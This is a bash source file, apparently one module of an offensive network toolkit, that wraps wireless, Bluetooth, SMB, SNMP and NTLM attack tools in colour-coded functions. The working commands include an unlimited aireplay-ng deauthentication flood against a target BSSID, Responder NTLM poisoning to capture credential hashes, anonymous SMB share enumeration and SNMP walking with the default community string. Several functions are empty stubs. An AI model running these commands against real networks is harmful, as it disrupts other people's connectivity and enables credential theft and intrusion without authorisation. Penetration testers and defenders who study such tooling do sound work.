#!/bin/bash

# LOL Network Module - Ethernet, Wi-Fi, BT, SIGINT

get_wifi_iface() {
    iw dev | awk '$1=="Interface"{print $2; exit}' || echo "wlan0"
}

set_wifi_iface() {
    WIFI_IFACE=$(get_wifi_iface)
    echo -e "${NEON_BLUE}[*] Setting $WIFI_IFACE to Monitor Mode...${RESET}"
    sudo ip link set $WIFI_IFACE down
    sudo iw dev $WIFI_IFACE set type monitor
    sudo ip link set $WIFI_IFACE up
    echo -e "${NEON_GREEN}[+] $WIFI_IFACE is now in Monitor Mode${RESET}"
}

wifi_handshake() {
    WIFI_IFACE=$(get_wifi_iface)
    echo -e "${NEON_PINK}[!] SCANNING FOR TARGETS (Ctrl+C to stop)${RESET}"
    sudo airodump-ng $WIFI_IFACE
}

wifi_deauth() {
    local TARGET_BSSID=$1
    WIFI_IFACE=$(get_wifi_iface)
    echo -e "${NEON_PINK}[!] DEAUTH ATTACK ON $TARGET_BSSID${RESET}"
    sudo aireplay-ng --deauth 0 -a $TARGET_BSSID $WIFI_IFACE
}

bt_recon() {
    echo -e "${NEON_BLUE}[*] Scanning for Bluetooth Devices...${RESET}"
    hcitool scan
}

direct_link_disco() {
    echo -e "${NEON_BLUE}[*] Discovering direct ethernet links...${RESET}"
    sudo tcpdump -i $(get_main_iface) -c 50 -n
}

share_hunter() {
    local TARGET=$1
    echo -e "${NEON_BLUE}[*] Searching for open shares on $TARGET...${RESET}"
    smbclient -L //$TARGET -N
}

wpad_audit() {
    echo -e "${NEON_BLUE}[*] Auditing WPAD configurations...${RESET}"
}

nac_bypass() {
    echo -e "${NEON_PINK}[!] NAC BYPASS ATTEMPT...${RESET}"
}

ntlm_poison() {
    echo -e "${NEON_BLUE}[*] Starting NTLM Poisoning...${RESET}"
    sudo responder -I $(get_main_iface) -dwP
}

gateway_hunt() {
    echo -e "${NEON_BLUE}[*] Hunting for network gateways...${RESET}"
    route -n
}

protocol_audit() {
    echo -e "${NEON_BLUE}[*] Auditing network protocols...${RESET}"
}

vlan_hop_recon() {
    echo -e "${NEON_BLUE}[*] VLAN Hopping reconnaissance...${RESET}"
}

snmp_map() {
    local TARGET=$1
    echo -e "${NEON_BLUE}[*] Mapping SNMP on $TARGET...${RESET}"
    snmpwalk -v2c -c public $TARGET
}
